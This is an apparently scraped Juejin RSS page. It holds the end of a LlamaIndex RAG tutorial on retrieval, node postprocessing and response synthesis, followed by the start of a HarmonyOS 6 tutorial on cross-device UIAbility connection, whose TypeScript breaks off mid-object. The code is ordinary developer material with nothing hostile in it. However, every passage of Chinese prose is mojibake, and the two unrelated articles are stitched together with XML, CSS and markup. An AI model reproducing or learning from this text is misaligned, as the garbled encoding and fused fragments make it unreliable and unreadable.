<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.llamaindex.ai%2Fpython%2Fframework%2Fmodule" target="_blank" title="https://developers.llamaindex.ai/python/framework/module" ref="nofollow noopener noreferrer">developers.llamaindex.ai/python/framâ€¦</a>_guides/indexing/index_guide/#vector-store-index</p>
<p><strong>æ£€ç´¢æŸ¥è¯¢</strong></p>
<p>æœ‰äº†æ•°æ®ä¹Ÿè¿›è¡Œäº†å‘é‡åŒ–å­˜å‚¨ï¼Œå¹¶å¾—åˆ°äº†Indexç´¢å¼•å¯¹è±¡ï¼Œç°åœ¨å°±å¯ä»¥è¿›è¡Œæ£€ç´¢å¹¶åŠ å…¥å¤§æ¨¡å‹ä¸Šä¸‹æ–‡ï¼Œå›ç­”é—®é¢˜ã€‚LlamaIndexçš„æ£€ç´¢æŸ¥è¯¢åŒ…æ‹¬ä¸‰æ­¥éª¤ï¼š<strong>æ£€ç´¢Node -&gt; åç½®å¤„ç†è¿‡æ»¤Node -&gt; å“åº”åˆæˆ</strong></p>
<p><strong>1ã€ä»…æ£€ç´¢</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ä¸Šæ–‡å¾—åˆ°çš„indexç´¢å¼•å¯¹è±¡</span>
<span class="hljs-attr">retriever</span> = index.as_retriever()
<span class="hljs-attr">nodes</span> = retriever.retrieve(<span class="hljs-string">"è‚²å„¿æ–¹å¼"</span>)
print(f"len:{len(nodes)} nodes:{nodes<span class="hljs-section">[0]</span>.text}")
<span class="hljs-comment"># å¦ä¸€ç§æ–¹å¼ï¼šç›´æ¥å®šä¹‰VectorIndexRetrieverï¼ŒæŒ‡å®šindex</span>
<span class="hljs-attr">retriever</span> = VectorIndexRetriever(
<span class="hljs-attr">index</span>=index,
<span class="hljs-attr">similarity_top_k</span>=<span class="hljs-number">1</span>, <span class="hljs-comment"># å¬å›ä¸€æ¡æ•°æ®</span>
)
<span class="hljs-attr">nodes</span> = retriever.retrieve(<span class="hljs-string">"è‚²å„¿æ–¹å¼"</span>)
print(f"len:{len(nodes)} nodes:{nodes<span class="hljs-section">[0]</span>.text}")
</code></pre>
<p>ç¤ºä¾‹ä½¿ç”¨indexçš„as_retriever()æ–¹æ³•å¾—åˆ°VectorIndexRetrieverï¼Œç„¶åè°ƒç”¨retrieveæ–¹æ³•æ¥æ£€ç´¢nodeåˆ—è¡¨ã€‚ç›´æ¥å®šä¹‰VectorIndexRetrieveræ•ˆæœä¸€æ ·ã€‚</p>
<p><strong>2ã€åç½®å¤„ç†è¿‡æ»¤Node</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å¯¼å…¥postprocessor</span>
from llama_index.core.postprocessor import KeywordNodePostprocessor, SimilarityPostprocessor
<span class="hljs-attr">node_postprocessors</span>=[
<span class="hljs-comment"># ç›¸ä¼¼æ€§</span>
SimilarityPostprocessor(
similarity_cut<span class="hljs-literal">off</span>=<span class="hljs-number">0.1</span>
)
]
<span class="hljs-attr">query</span> = index.as_query_engine(llm=llm,
<span class="hljs-attr">node_postprocessors</span>=node_postprocessors)
</code></pre>
<p>ç¤ºä¾‹ä½¿ç”¨äº†ç›¸ä¼¼æ€§åˆ†æ•°è¿‡æ»¤Nodeï¼Œè¿‡æ»¤åæŠŠæ›´å°‘çš„Nodeä¿¡æ¯ä½œä¸ºä¸Šä¸‹æ–‡ä¼ é€’ç»™å¤§æ¨¡å‹ï¼Œå‡å°‘å¤§æ¨¡å‹çš„Tokenæ•°é‡ä»¥åŠé™ä½å“åº”æ—¶é—´ã€‚æ›´å¤šåç½®å¤„ç†å™¨è§ä¸‹é¢åœ°å€ã€‚</p>
<p><strong>3ã€å“åº”åˆæˆ-æ£€ç´¢åå‘èµ·å¤§æ¨¡å‹å¯¹è¯</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æŸ¥è¯¢</span>
from llama_index.llms.deepseek import DeepSeek
<span class="hljs-attr">llm</span> = DeepSeek(model=<span class="hljs-string">"deepseek-chat"</span>,
<span class="hljs-attr">api_key</span>=<span class="hljs-string">"sk-..."</span>)
from llama_index.core.response_synthesizers import ResponseMode
from llama_index.core import get_response_synthesizer
<span class="hljs-comment"># å®šä¹‰å“åº”åˆæˆé€»è¾‘ï¼Œé»˜è®¤æ˜¯ResponseMode.COMPACT</span>
<span class="hljs-comment"># "compact": åˆå¹¶Nodeä½œä¸ºä¸Šä¸‹æ–‡ï¼Œå¦‚æœè¶…é•¿ï¼Œåˆ™ä½¿ç”¨refineæç‚¼ï¼Œå‡å°‘æ¨¡å‹çš„è¯·æ±‚æ¬¡æ•°ï¼Œæœ€ç»ˆå€ŸåŠ©ç”Ÿæˆä¸€ä¸ªç­”æ¡ˆ</span>
<span class="hljs-attr">response_synthesizer</span> = get_response_synthesizer(
<span class="hljs-attr">response_mode</span>=ResponseMode.COMPACT
)
<span class="hljs-attr">query</span> = index.as_query_engine(llm=llm,
<span class="hljs-attr">response_synthesizer</span>=response_synthesizer)
print(query.query("è‚²å„¿æ–¹å¼?"))
</code></pre>
<p>ç¤ºä¾‹é€šè¿‡ä½¿ç”¨indexçš„as_query_engine()æ–¹æ³•å¾—åˆ°queryå¼•æ“ï¼Œå¹¶æŒ‡å®š<strong>å“åº”åˆæˆæ¨¡å¼â€œcompactâ€</strong> ï¼Œè¿™ä¸ªä¹Ÿæ˜¯é»˜è®¤æ¨¡å¼ï¼Œå«ä¹‰è§ä¸Šä»£ç æ³¨é‡Šï¼Œæœ€åè°ƒç”¨queryæ–¹æ³•å€ŸåŠ©LLMç”Ÿæˆç­”æ¡ˆã€‚</p>
<p>as_query_engineä¼šè·å–æ— çŠ¶æ€çš„æŸ¥è¯¢å¼•æ“ï¼Œå¦æœ‰as_chat_engineæ”¯æŒå¤šè½®å¯¹è¯çš„æœ‰çŠ¶æ€æŸ¥è¯¢å¼•æ“ã€‚</p>
<p>compactæ˜¯å…¶ä¸­ä¸€ç§åˆæˆæ¨¡å¼ï¼Œè®©ChatGPTåŸºäºå®˜æ–¹æ–‡æ¡£ç”Ÿæˆçš„ä¸åŒæ¨¡å¼çš„å¯¹ç…§è¡¨ï¼Œä¾›å‚è€ƒï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abd1ca0052d54e9f9202e00fd43a1656~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764594827&amp;x-signature=DQoMaN4UKokHtYEFusbwRAVvUv8%3D" alt="" loading="lazy"/></p>
<p>ä¸ºä»€ä¹ˆä¼šæœ‰ä¸åŒçš„å“åº”åˆæˆæ¨¡å¼å‘¢ï¼Ÿ</p>
<p>æ˜¯å› ä¸º RAG é‡Œæ‹¿åˆ°çš„æ–‡æ¡£å¾€å¾€æ˜¯å¤šä¸ª chunkï¼Œè€Œ LLM çš„ prompt æœ‰é•¿åº¦é™åˆ¶ã€‚</p>
<p>æ‰€ä»¥ LlamaIndex æä¾›äº†å¤šç§â€œæ€æ ·åˆæˆç­”æ¡ˆâ€çš„ç­–ç•¥ã€‚</p>
<p>ä¸åŒçš„åç½®è¿‡æ»¤å™¨ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.llamaindex.ai%2Fpython%2Fframework%2Fmodule" target="_blank" title="https://developers.llamaindex.ai/python/framework/module" ref="nofollow noopener noreferrer">developers.llamaindex.ai/python/framâ€¦</a>_guides/querying/node_postprocessors/node_postprocessors/</p>
<p>ä¸åŒå“åº”åˆæˆæ¨¡å¼ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.llamaindex.ai%2Fpython%2Fframework%2Fmodule" target="_blank" title="https://developers.llamaindex.ai/python/framework/module" ref="nofollow noopener noreferrer">developers.llamaindex.ai/python/framâ€¦</a>_guides/querying/response_synthesizers/</p>
<p>åŠå¯¹åº”ä»£ç ç±»å‹å®šä¹‰ï¼šllama_index.core.response_synthesizers.type.ResponseMode</p>
<h2 data-id="heading-3"><strong>04 æ€»ç»“</strong></h2>
<p>ä»æ•´ä½“æ¥çœ‹ï¼ŒLlamaIndex å·²ç»æ„å»ºå‡ºä¸€ä¸ªè¦†ç›–Â <strong>æ•°æ®æ¥å…¥ â†’ æ–‡æœ¬è§£æ â†’ å‘é‡åŒ–ä¸å­˜å‚¨ â†’ æ£€ç´¢ç­–ç•¥ â†’ å“åº”ç”Ÿæˆ</strong>Â çš„å®Œæ•´ RAG æŠ€æœ¯æ ˆï¼Œæä¾›äº†é«˜åº¦æ¨¡å—åŒ–ã€å¯è‡ªç”±ç»„åˆçš„èƒ½åŠ›ã€‚</p>
<p>æœ¬æ–‡å±•ç¤ºçš„ç¤ºä¾‹ä»…æ˜¯ LlamaIndex åŠŸèƒ½ä½“ç³»ä¸­çš„ä¸€å°éƒ¨åˆ†ã€‚æ›´å¤šä¸°å¯Œçš„ç´¢å¼•ç±»å‹ã€æ£€ç´¢æ¨¡å¼ã€æ•°æ®è¿æ¥å™¨ï¼Œä»¥åŠä¼ä¸šçº§åœºæ™¯çš„æ¨¡æ¿ä¸å®è·µï¼Œå¯ä»¥åœ¨å®˜æ–¹æ–‡æ¡£æˆ– LlamaHub ä¸­å­¦ä¹ å’Œé˜…è¯»ã€‚</p>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œé™¤äº† RAG ç›¸å…³ç»„ä»¶å¤–ï¼Œ<strong>LlamaIndex è¿˜æä¾›äº† åŸºäºäº‹ä»¶é©±åŠ¨çš„ Workflow å·¥ä½œæµ ä¸ Agent æ™ºèƒ½ä½“ èƒ½åŠ›</strong>ï¼Œèƒ½å¤Ÿè¿›ä¸€æ­¥æ”¯æŒå¤æ‚ä»»åŠ¡ç¼–æ’ã€å¤šæ¨¡å‹åä½œç­‰æ›´é«˜çº§çš„åº”ç”¨æ¨¡å¼ã€‚è¿™äº›åœ¨åç»­æ–‡ç« ä¸­é€ä¸€å±•å¼€ã€‚</p>
<h3 data-id="heading-4">å­¦ä¹ èµ„æºæ¨è</h3>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€HarmonyOS 6ã€‘UIAbilityè·¨è®¾å¤‡è¿æ¥è¯¦è§£ï¼ˆåˆ†å¸ƒå¼è½¯æ€»çº¿è¿ç”¨ï¼‰]]></title>    <link>https://juejin.cn/post/7575897635138011136</link>    <guid>https://juejin.cn/post/7575897635138011136</guid>    <pubDate>2025-11-24T13:31:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575897635138011136" data-draft-id="7576105458807439360" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€HarmonyOS 6ã€‘UIAbilityè·¨è®¾å¤‡è¿æ¥è¯¦è§£ï¼ˆåˆ†å¸ƒå¼è½¯æ€»çº¿è¿ç”¨ï¼‰"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-11-24T13:31:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GeorgePanda"/> <meta itemprop="url" content="https://juejin.cn/user/1239904847930654"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€HarmonyOS 6ã€‘UIAbilityè·¨è®¾å¤‡è¿æ¥è¯¦è§£ï¼ˆåˆ†å¸ƒå¼è½¯æ€»çº¿è¿ç”¨ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1239904847930654/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GeorgePanda
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T13:31:50.000Z" title="Mon Nov 24 2025 13:31:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ã€HarmonyOS 6ã€‘UIAbilityè·¨è®¾å¤‡è¿æ¥è¯¦è§£ï¼ˆåˆ†å¸ƒå¼è½¯æ€»çº¿è¿ç”¨ï¼‰</h2>
<h3 data-id="heading-1">ä¸€ã€å‰è¨€</h3>
<p>æˆ‘å¯¹äºåˆ†å¸ƒå¼è½¯æ€»çº¿ç›¸å½“çš„äº²åˆ‡ã€‚2022å¹´æå¼€æºé¸¿è’™çš„æ—¶å€™ï¼Œå°±ç»å¸¸å’Œåˆ†å¸ƒå¼è½¯æ€»çº¿æ‰“äº¤é“ã€‚åœ¨HarmonyOSä¸­ï¼ŒUIAbilityè·¨è®¾å¤‡è¿æ¥ï¼Œå…¶å®å°±æ˜¯å¯¹åº•å±‚å¼€æºé¸¿è’™ï¼Œåˆ†å¸ƒå¼è½¯æ€»çº¿çš„èƒ½åŠ›å°è£…ã€‚</p>
<h3 data-id="heading-2">äºŒã€é¦–å…ˆç†è§£è·¨è®¾å¤‡é“¾æ¥çš„æ­¥éª¤</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae6115adcf884c769cd876808f415ba7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2VvcmdlUGFuZGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764595910&amp;x-signature=knzdpWi8hSG3jKBXJGwjFCkYMLg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>é¦–å…ˆç”±Distributed Service Kitæä¾›è¯¥èƒ½åŠ›çš„å°è£…ã€‚</p>
<p>åœ¨è¿›è¡Œè·¨è®¾å¤‡é“¾æ¥ä¹‹å‰ï¼Œæˆ‘ä»¬è¦å¯¹è®¾å¤‡è¿›è¡Œäº’ä¿¡æ“ä½œã€‚è¿™ä¸ªåœ¨é¸¿è’™é‡Œå«åšåˆ†å¸ƒå¼è®¾å¤‡ç®¡ç†ï¼ŒåŒ…å«äº†è®¾å¤‡çš„å‘ç°ï¼Œé…å¯¹ï¼Œå¯ä¿¡æŸ¥è¯¢ï¼Œè§£é™¤é…å¯¹ç­‰ã€‚<strong>è¯¦æƒ…å¯å‚è§æˆ‘ä¹‹å‰å†™çš„æ–‡ç« ï¼šã€HarmonyOS 5ã€‘é¸¿è’™åˆ†å¸ƒå¼ååŒåº”ç”¨å¼€å‘è¯¦è§£</strong></p>
<p>è¿›è¡Œå®Œä¸Šé¢çš„å¯ä¿¡æ“ä½œï¼Œæˆ‘ä»¬æ‰èƒ½å¯¹äºè®¾å¤‡é—´çš„é“¾æ¥é€šä¿¡åšå¤„ç†ã€‚</p>
<h3 data-id="heading-3">ä¸‰ã€ä¸“æœ‰åè¯ç†è§£ï¼š</h3>
<p><strong>DMSï¼ˆDistributedsched Management Serviceï¼‰ï¼š</strong>
åˆ†å¸ƒå¼ç»„ä»¶ç®¡ç†æ¡†æ¶ï¼Œç›¸å½“äºè·¨è®¾å¤‡ååŒçš„â€œä¸­é—´äººâ€ï¼Œè´Ÿè´£ç®¡ç†ç»„ä»¶å’Œå»ºç«‹è¿æ¥</p>
<p><strong>UIAbilityï¼š</strong>
åº”ç”¨çš„ç•Œé¢äº¤äº’æ ¸å¿ƒï¼Œç®¡ç”Ÿå‘½å‘¨æœŸã€ç”¨æˆ·äº¤äº’å’Œç•Œé¢æ¸²æŸ“ï¼Œè·¨è®¾å¤‡ååŒæœ¬è´¨å°±æ˜¯ä¸¤å°è®¾å¤‡çš„UIAbilityåœ¨â€œå¯¹è¯â€</p>
<h3 data-id="heading-4">å››ã€ç¯å¢ƒå‡†å¤‡æ­¥éª¤</h3>
<p>å·¥æ¬²å–„å…¶äº‹ï¼Œå…ˆæŠŠç¯å¢ƒæ­å¥½ï¼š
1ã€ç¡¬ä»¶ï¼šä¸¤å°èƒ½ç™»å½•åä¸ºè´¦å·çš„è®¾å¤‡ï¼ˆAå’ŒBï¼‰ï¼Œéœ€è¦æ”¯æŒAPI 18
2ã€å¼€å‘å·¥å…·ï¼šDevEco Studio 4.1åŠä»¥ä¸Šï¼Œpublic-SDKæ›´æ–°åˆ°API 18+
3ã€è®¾å¤‡è¿æ¥ï¼šç”¨USBçº¿æŠŠä¸¤å°è®¾å¤‡è¿åˆ°PCï¼Œæ‰“å¼€è“ç‰™è®©è®¾å¤‡äº’ç›¸è¯†åˆ«ç»„ç½‘
4ã€éªŒè¯ç»„ç½‘ï¼šPCç«¯æ‰§è¡Œshellå‘½ä»¤ï¼Œæ˜¾ç¤ºâ€œremote device num = 1â€å°±æ˜¯ç»„ç½‘æˆåŠŸ</p>
<pre><code class="hljs language-shell" lang="shell">hdc shell
hidumper -s 4700 -a "buscenter -l remote_device_info"
</code></pre>
<p>ä¹Ÿå¯é€šè¿‡å‰ç½®æ­¥éª¤çš„åˆ†å¸ƒå¼è®¾å¤‡ç®¡ç†ï¼Œæ¥éªŒè¯è®¾å¤‡çš„å¯ä¿¡ã€‚</p>
<h3 data-id="heading-5">äº”ã€æºç æ­¥éª¤æ‹†è§£ï¼š</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/659948c1277d49d184925e22797b4aa6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2VvcmdlUGFuZGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764595910&amp;x-signature=CEhr7hgvAzsnGruuJAoPTdtpBvI%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h4 data-id="heading-6">1ã€ å¯¼å…¥æ ¸å¿ƒæ¨¡å—</h4>
<p>é¦–å…ˆè¦å¯¼å…¥åˆ†å¸ƒå¼æœåŠ¡ç›¸å…³çš„Kitï¼Œä¸ç®¡æ˜¯å‘èµ·ç«¯è¿˜æ˜¯æ¥æ”¶ç«¯éƒ½éœ€è¦ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { abilityConnectionManager, distributedDeviceManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.DistributedServiceKit'</span>;
<span class="hljs-keyword">import</span> { common, <span class="hljs-title class_">AbilityConstant</span>, <span class="hljs-title class_">UIAbility</span>, <span class="hljs-title class_">Want</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;
<span class="hljs-keyword">import</span> { hilog } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.PerformanceAnalysisKit'</span>;
</code></pre>
<h4 data-id="heading-7">2ã€ å‘ç°ç›®æ ‡è®¾å¤‡ï¼ˆè®¾å¤‡Aä¾§ï¼‰</h4>
<p>è®¾å¤‡Aè¦å…ˆæ‰¾åˆ°è®¾å¤‡Bçš„networkIdï¼Œä½œä¸ºè¿æ¥çš„å…³é”®å‚æ•°ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">dmClass</span>: distributedDeviceManager.<span class="hljs-property">DeviceManager</span>;

<span class="hljs-comment">// åˆå§‹åŒ–è®¾å¤‡ç®¡ç†å®ä¾‹</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">initDmClass</span>(<span class="hljs-params"/>): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">try</span> {
    dmClass = distributedDeviceManager.<span class="hljs-title function_">createDeviceManager</span>(<span class="hljs-string">'com.example.remotephotodemo'</span>);
  } <span class="hljs-keyword">catch</span> (err) {
    hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'åˆ›å»ºè®¾å¤‡ç®¡ç†å®ä¾‹å¤±è´¥: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(err));
  }
}

<span class="hljs-comment">// è·å–è®¾å¤‡Bçš„networkId</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getRemoteDeviceId</span>(<span class="hljs-params"/>): <span class="hljs-built_in">string</span> | <span class="hljs-literal">undefined</span> {
  <span class="hljs-title function_">initDmClass</span>();
  <span class="hljs-keyword">if</span> (!dmClass) <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;
  
  hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'å¼€å§‹æŸ¥æ‰¾è¿œç¨‹è®¾å¤‡'</span>);
  <span class="hljs-keyword">const</span> deviceList = dmClass.<span class="hljs-title function_">getAvailableDeviceListSync</span>();
  
  <span class="hljs-keyword">if</span> (!deviceList || deviceList.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'æœªæ‰¾åˆ°å¯ç”¨è®¾å¤‡'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;
  }
  
  <span class="hljs-comment">// è¿™é‡Œå–ç¬¬ä¸€ä¸ªè®¾å¤‡ï¼Œå®é™…å¼€å‘å¯åšè®¾å¤‡é€‰æ‹©åˆ—è¡¨</span>
  <span class="hljs-keyword">return</span> deviceList[<span class="hljs-number">0</span>].<span class="hljs-property">networkId</span>;
}
</code></pre>
<h4 data-id="heading-8">3ã€åˆ›å»ºä¼šè¯å¹¶è¿æ¥ï¼ˆä¸¤ç«¯æ“ä½œä¸åŒï¼‰</h4>
<h5 data-id="heading-9">è®¾å¤‡Aï¼ˆå‘èµ·ç«¯ï¼‰ï¼šåˆ›å»ºä¼šè¯+å‘èµ·è¿æ¥</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@StorageLink</span>(<span class="hljs-string">'sessionId'</span>) <span class="hljs-attr">sessionId</span>: <span class="hljs-built_in">number</span> = -<span class="hljs-number">1</span>;

<span class="hljs-comment">// é…ç½®è®¾å¤‡Bçš„ååŒä¿¡æ¯</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">peerInfo</span>: abilityConnectionManager.<span class="hljs-property">PeerInfo</span> = {
  <span class="hljs-attr">deviceId</span>: <span class="hljs-title function_">getRemoteDeviceId</span>()!, <span class="hljs-comment">// è®¾å¤‡Bçš„networkId</span>
  <span class="hljs-attr">bundleName</span>: <span class="hljs-string">'com.example.remotephotodemo'</span>, <span class="hljs-comment">// å¿…é¡»å’Œè®¾å¤‡Båº”ç”¨ä¸€è‡´</span>
  <span class="hljs-attr">moduleName</span>: <span class="hljs-string">'entry'</span>,
